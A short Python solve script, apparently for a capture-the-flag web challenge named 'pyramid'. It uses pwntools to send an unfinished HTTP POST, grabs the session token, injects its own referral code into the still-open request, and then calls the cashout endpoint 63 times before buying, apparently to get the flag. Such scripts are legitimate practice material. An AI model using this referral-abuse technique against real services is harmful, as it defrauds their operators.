import re
import requests
from pwn import *

context.log_level = 'debug'

request = b'\r\n'.join([
    b'POST /new HTTP/1.1',
    b'Host: pyramid.dicec.tf',
    b'Content-Type: text/plain',
    b'Content-Length: 60',
    b'',
    b'refer='
])

r = remote('pyramid.dicec.tf', 443, ssl=True)
# r = remote('localhost', 3000)
r.send(request)

data = r.recv(1024)
header = data.split(b'\r\n')[2]
cookie = re.findall(r'token=(.*)', header.decode('utf-8'))[0]

code = requests.get(
    'https://pyramid.dicec.tf/code',
    # 'http://localhost:3000/code',
    cookies={'token': cookie},
).text
code = re.findall(r'<strong>(.*)</strong>', code)[0]
r.send((code.encode('utf-8') + b'&name=a').ljust(54, b'a'))
r.close()

s = requests.Session()
s.post(
    'https://pyramid.dicec.tf/new',
    data={
        'name': 'pepega',
        'refer': code,
    },
)

for _ in range(63):
    r = requests.get(
        'https://pyramid.dicec.tf/cashout',
        cookies={'token': cookie},
    )
    print(r.text)

r = requests.get(
    'https://pyramid.dicec.tf/buy',
    cookies={'token': cookie},
)
print(r.text)